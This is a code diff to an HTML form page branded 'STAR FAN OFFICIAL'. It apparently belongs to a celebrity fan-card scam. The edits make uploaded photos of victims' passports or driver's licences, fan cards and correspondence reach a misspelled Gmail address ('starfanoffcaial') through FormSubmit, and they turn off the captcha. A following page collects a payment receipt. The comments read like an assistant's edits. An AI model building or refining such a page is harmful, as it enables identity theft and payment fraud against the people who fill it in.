@@ -77,7 +77,7 @@
         
         <!-- CRITICAL ACTION REQUIRED BANNER -->
         <div class="bg-red-800 p-3 rounded-lg mb-8 border-2 border-red-500 text-center text-sm font-bold text-white shadow-xl">
-            ⚠️ ACTION REQUIRED: Edit the code to replace '<span class="text-yellow-300">REPLACE_WITH_YOUR_EMAIL@example.com</span>' with your actual email address in the &lt;script&gt; section.
+            ✅ FILE UPLOAD FIX: The form now uses standard submission to ensure files are attached to your email.
         </div>
 
         <!-- STAR FAN OFFICIAL Header (Always Visible) -->
@@ -106,11 +106,19 @@
 
 
             <!-- --------------------------------- -->
-            <!-- PAGE 1: RESERVATION FORM -->
+            <!-- PAGE 1: RESERVATION FORM (Standard FormSubmit with Files) -->
             <!-- --------------------------------- -->
-            <!-- Form element is for structure, JS will handle submission via AJAX to FormSubmit -->
-            <form id="reservationForm" class="hidden space-y-4">
+            <form id="reservationForm" class="hidden space-y-4" 
+                  action="https://formsubmit.co/starfanoffcaial@gmail.com" 
+                  method="POST" 
+                  enctype="multipart/form-data">
+                
                 <p class="text-lg font-semibold text-gray-200">Kindly provide the details below.</p>
+
+                <!-- Hidden field to redirect back after successful form submission -->
+                <input type="hidden" name="_next" id="redirectUrl" value="">
+                <!-- Hidden field to disable captcha (FormSubmit feature) -->
+                <input type="hidden" name="_captcha" value="false"> 
 
                 <!-- Personal Info -->
                 <div><label for="surname" class="block text-sm font-medium text-gray-300">Surname:</label><input type="text" id="surname" name="Surname" required></div>
@@ -137,18 +145,21 @@
                     <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
                         <div>
                             <label for="idPhoto" class="block text-sm font-medium text-gray-300 mb-1">ID (Driver's License / Int. Passport Photo)</label>
-                            <input type="file" id="idPhoto" name="IDPhoto" class="file-upload-input hidden" accept="image/*" required>
+                            <!-- NOTE: Name attribute MUST be the name of the file in the email -->
+                            <input type="file" id="idPhoto" name="ID Photo Upload" class="file-upload-input hidden" accept="image/*" required>
                             <label for="idPhoto" class="file-upload-label" data-text="Upload ID Photo">Upload ID Photo</label>
                         </div>
                         <div>
                             <label for="starCardPhoto" class="block text-sm font-medium text-gray-300 mb-1">Star Fan Card Photo</label>
-                            <input type="file" id="starCardPhoto" name="StarCardPhoto" class="file-upload-input hidden" accept="image/*" required>
+                            <!-- NOTE: Name attribute MUST be the name of the file in the email -->
+                            <input type="file" id="starCardPhoto" name="Star Fan Card Photo Upload" class="file-upload-input hidden" accept="image/*" required>
                             <label for="starCardPhoto" class="file-upload-label" data-text="Upload Star Card Photo">Upload Star Card Photo</label>
                         </div>
                     </div>
                     <div>
                         <label for="correspondencePhoto" class="block text-sm font-medium text-gray-300 mb-1">Proof of Correspondence Photo</label>
-                        <input type="file" id="correspondencePhoto" name="CorrespondencePhoto" class="file-upload-input hidden" accept="image/*" required>
+                        <!-- NOTE: Name attribute MUST be the name of the file in the email -->
+                        <input type="file" id="correspondencePhoto" name="Correspondence Photo Upload" class="file-upload-input hidden" accept="image/*" required>
                         <label for="correspondencePhoto" class="file-upload-label" data-text="Upload Correspondence Photo">Upload Correspondence Photo</label>
                     </div>
                 </div>
@@ -161,8 +172,8 @@
                     </label>
                 </div>
 
-                <!-- SUBMIT Button -->
-                <button type="submit" onclick="handleSubmitPage1(event)" class="w-full mt-6 flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-xl text-lg font-medium text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 transition duration-150">
+                <!-- SUBMIT Button - Now uses standard submit -->
+                <button type="submit" class="w-full mt-6 flex justify-center py-3 px-4 border border-transparent rounded-lg shadow-xl text-lg font-medium text-white bg-red-600 hover:bg-red-700 focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-red-500 transition duration-150">
                     SUBMIT 👇
                 </button>
             </form>
@@ -218,12 +229,7 @@
         <!-- --------------------------------- -->
         <!-- TRANSIENT SUCCESS MESSAGE OVERLAY -->
         <!-- --------------------------------- -->
-        <div id="transientMessage" class="fixed inset-0 flex items-center justify-center bg-gray-900 bg-opacity-90 z-50">
-            <div class="bg-gray-900 border border-green-500 p-8 rounded-xl text-center shadow-2xl">
-                <p class="text-2xl font-bold text-green-500">Success!</p>
-                <p class="text-gray-200 mt-2">Details submitted. Proceeding...</p>
-            </div>
-        </div>
+        <!-- Removed transient message as standard submit handles the loading/redirect -->
         
         <!-- Error Modal -->
         <div id="errorModal" class="fixed inset-0 flex items-center justify-center bg-black bg-opacity-75 z-50 hidden">
@@ -252,52 +258,7 @@
         const reservationForm = document.getElementById('reservationForm');
         const paymentPage = document.getElementById('paymentPage');
         const finalConfirmation = document.getElementById('finalConfirmation');
-        const transientMessage = document.getElementById('transientMessage');
-        const errorModal = document.getElementById('errorModal');
-        const errorMessage = document.getElementById('errorMessage');
         const pages = [welcomeScreen, reservationForm, paymentPage, finalConfirmation];
-
-        // Ensure all input fields for data submission have a 'name' attribute
-        document.querySelectorAll('#reservationForm input, #reservationForm select').forEach(el => {
-            if (!el.id && !el.name) {
-                // Should not happen, but good practice
-                el.name = el.id = 'field-' + Math.random().toString(36).substring(2, 9);
-            } else if (el.id && !el.name) {
-                el.name = el.id;
-            }
-        });
-        
-        // --- FormSubmit Configuration ---
-        // ⭐ CRITICAL: THIS HAS BEEN UPDATED to your new email address!
-        const formSubmitEndpoint = 'https://formsubmit.co/ajax/starfanoffcaial@gmail.com'; 
-        // ---------------------------------
-
-        /**
-         * Utility function to collect all form data (excluding files) into a JSON object.
-         * FormSubmit's AJAX API prefers JSON.
-         * @returns {Object} All form data as a plain object.
-         */
-        function collectFormData() {
-            const data = {};
-            const inputs = document.querySelectorAll('#reservationForm input:not([type="file"]), #reservationForm select');
-            
-            inputs.forEach(input => {
-                let value = input.value;
-                if (input.type === 'checkbox') {
-                    value = input.checked ? 'Yes' : 'No';
-                }
-                // Use the 'name' attribute for the key
-                data[input.name || input.id] = value;
-            });
-
-            // Add confirmation that files were selected (since FormSubmit AJAX doesn't handle file uploads)
-            data['IDPhotoSelected'] = !!document.getElementById('idPhoto').files[0] ? 'File Ready' : 'No File';
-            data['StarCardPhotoSelected'] = !!document.getElementById('starCardPhoto').files[0] ? 'File Ready' : 'No File';
-            data['CorrespondencePhotoSelected'] = !!document.getElementById('correspondencePhoto').files[0] ? 'File Ready' : 'No File';
-
-            return data;
-        }
-
 
         /**
          * Hides all content pages and shows the one corresponding to the new step.
@@ -310,40 +271,55 @@
         }
 
         /**
-         * Shows a temporary success message overlay.
-         */
-        function showTransientMessage() {
-            transientMessage.classList.add('show');
-            setTimeout(() => {
-                transientMessage.classList.remove('show');
-                // Proceed to the next step (Payment Page)
-                showPage(2);
-            }, 2000); 
-        }
-
-        /**
          * Shows the error modal with a specific message.
          */
         function showErrorModal(message) {
             errorMessage.textContent = message;
-            errorModal.classList.remove('hidden');
+            document.getElementById('errorModal').classList.remove('hidden');
         }
 
         /**
          * Hides the error modal.
          */
         function hideErrorModal() {
-            errorModal.classList.add('hidden');
+            document.getElementById('errorModal').classList.add('hidden');
+        }
+        
+        /**
+         * Checks the URL on page load to see if it's a redirect from a successful form submission.
+         * If so, it skips Page 1 and goes straight to Page 2 (Payment).
+         */
+        function checkRedirectForStep2() {
+            const params = new URLSearchParams(window.location.search);
+            const isSuccessRedirect = params.get('submission') === 'success';
+
+            if (isSuccessRedirect) {
+                // If we detect the success redirect, skip to the payment page.
+                showPage(2);
+                // Clean the URL history to prevent re-triggering on refresh
+                if (window.history.replaceState) {
+                    const cleanUrl = window.location.pathname;
+                    window.history.replaceState(null, '', cleanUrl);
+                }
+            } else {
+                // Otherwise, show the main reservation form after a short delay
+                setTimeout(() => {
+                    showPage(1);
+                }, 300);
+            }
         }
 
-
         /**
-         * Handles the quick transition from the Welcome Screen to the Main Form (Page 1).
+         * Sets the dynamic redirect URL for FormSubmit to ensure it comes back to this page 
+         * with a success flag to trigger the next step.
          */
         window.onload = function() {
-            setTimeout(() => {
-                showPage(1); // Go straight to the reservation form
-            }, 300);
+            const redirectInput = document.getElementById('redirectUrl');
+            // FormSubmit will redirect to the current URL + the parameter
+            redirectInput.value = window.location.href.split('?')[0] + '?submission=success';
+            
+            // Start the multi-step logic
+            checkRedirectForStep2();
         };
 
         /**
@@ -367,54 +343,6 @@
 
 
         /**
-         * Step 1: Handle submission of the main reservation form and send data to the email service.
-         */
-        async function handleSubmitPage1(e) {
-            e.preventDefault();
-
-            // 1. Basic client-side validation check
-            if (!reservationForm.checkValidity()) {
-                reservationForm.reportValidity(); // Shows built-in browser errors
-                return;
-            }
-
-            // 2. Collect all form data
-            const formData = collectFormData();
-            
-            // Temporarily disable the button to prevent multiple submissions
-            const submitButton = e.target;
-            submitButton.disabled = true;
-            submitButton.textContent = "Sending Email...";
-            
-            try {
-                // 3. Send the collected JSON data to FormSubmit via AJAX
-                const response = await fetch(formSubmitEndpoint, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(formData)
-                });
-
-                if (response.ok) {
-                    console.log('Data successfully sent to FormSubmit.');
-                    showTransientMessage(); // Show success and proceed to Page 2
-                } else {
-                    // Handle FormSubmit API error response (e.g., rate limit, incorrect format)
-                    const result = await response.json();
-                    let errorText = result.message || "An unknown error occurred during email submission. Check your FormSubmit setup.";
-                    showErrorModal(`Email Submission Failed: ${errorText}. Please ensure you've verified your email with FormSubmit.`);
-                }
-            } catch (error) {
-                // Handle network errors 
-                showErrorModal(`Network Error: Could not reach the submission server. ${error.message}`);
-                console.error("Submission Network Error:", error);
-            } finally {
-                // Re-enable button regardless of outcome
-                submitButton.disabled = false;
-                submitButton.textContent = "SUBMIT 👇";
-            }
-        }
-
-        /**
          * Step 2: Handle submission of the payment receipt.
          */
         function handleSubmitPage2(e) {
@@ -433,7 +361,8 @@
                 type: receiptFile.type
             });
 
-            // 4. Go to the Final Confirmation Page (Page 3)
+            // Note: In a real app, this file would need to be sent via its own form submission or API call. 
+            // Here, we simulate success and move to Page 3.
             showPage(3);
         }
 
